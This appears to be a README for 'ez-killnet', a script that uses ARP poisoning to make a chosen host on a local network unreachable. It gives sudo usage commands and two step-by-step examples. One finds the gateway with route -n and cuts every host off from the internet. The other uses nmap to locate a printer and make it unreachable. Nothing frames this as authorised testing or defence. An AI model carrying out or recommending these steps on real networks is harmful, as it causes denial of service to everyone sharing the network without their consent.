# ez-killnet
kill whole network (2.4GHz + 5GHz + eth + anything) using arp poisoning 

cd to directory and run the following 
sudo ./ez-killnet.py -i [interface to use for attack] -t [ipaddr to make unreachable on lan] 

example: (kill internet gateway) 
1. connect wlan0 to network 
2. route -n to find gateway (found it to be 192.168.10.1)
3. sudo ./ez-killnet.py -i wlan0 -t 192.168.10.1 
4. now all hosts on network cannot reach this gateway and they all have trouble connecting to the internet example: 

example: (kill valuable resources) 
1. connect eth0 to network 
2. nmap -sn 192.168.10.* to learn about hosts (found printer to be 192.168.10.226)
3. sudo ./ez-killnet.py -i eth0 -t 192.168.10.226 
4. now all hosts on network cannot reach this gateway and they all have trouble connecting to the internet 


